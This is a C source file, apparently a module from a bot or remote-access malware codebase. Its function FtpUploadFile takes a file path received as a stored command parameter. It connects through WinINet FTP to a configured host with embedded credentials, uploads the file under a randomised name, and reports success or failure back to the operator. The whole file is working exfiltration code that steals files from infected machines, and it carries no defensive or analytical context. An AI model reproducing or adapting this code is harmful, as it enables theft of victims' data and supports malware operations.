#include "../Includes/includes.h"

#ifndef HTTP_BUILD
#ifdef INCLUDE_FILESEARCH
DWORD WINAPI FtpUploadFile(LPVOID)
{
    char cFile[DEFAULT];
    strcpy(cFile, cStoreParameter);

    // <!-------! CRC AREA START !-------!>
    if(!bConfigSetupCheckpointTwo)
        return 0;
    // <!-------! CRC AREA STOP !-------!>

    if(FileExists(cFile))
    {
        HANDLE hInternetOpen = InternetOpen("FTP", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);

        HANDLE hInternetConnect = NULL;
        if(hInternetOpen)
        {
            hInternetConnect = InternetConnect(hInternetOpen, cFtpHost, INTERNET_DEFAULT_FTP_PORT, cFtpUser, cFtpPass, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, NULL);
            if(hInternetConnect)
            {
                char cRemoteFile[DEFAULT];
                strcpy(cRemoteFile, cFile);

                char *cBuildRemoteFile = strtok(cRemoteFile, "\\");
                while(cBuildRemoteFile != NULL)
                {
                    strcpy(cRemoteFile, cBuildRemoteFile);
                    cBuildRemoteFile = strtok(NULL, "\\");
                }

                itoa(GetRandNum(89999) + 10000, cBuild, 5);
                strcat(cRemoteFile, ".");
                strcat(cRemoteFile, cBuild);

                bool bFtpPutFile = FtpPutFile(hInternetConnect, cFile, cRemoteFile, FTP_TRANSFER_TYPE_BINARY, NULL);
                if(bFtpPutFile)
                    SendSuccessfulFileUpload(cFile, cRemoteFile);
                else
                    SendFailedToFileUpload();
            }
            else
                SendFailedToConnect();
        }
        else
            SendFailedToOpenInternetConnection();

        InternetCloseHandle(hInternetConnect);
        InternetCloseHandle(hInternetOpen);
    }

    return 1;
}
#endif
#endif
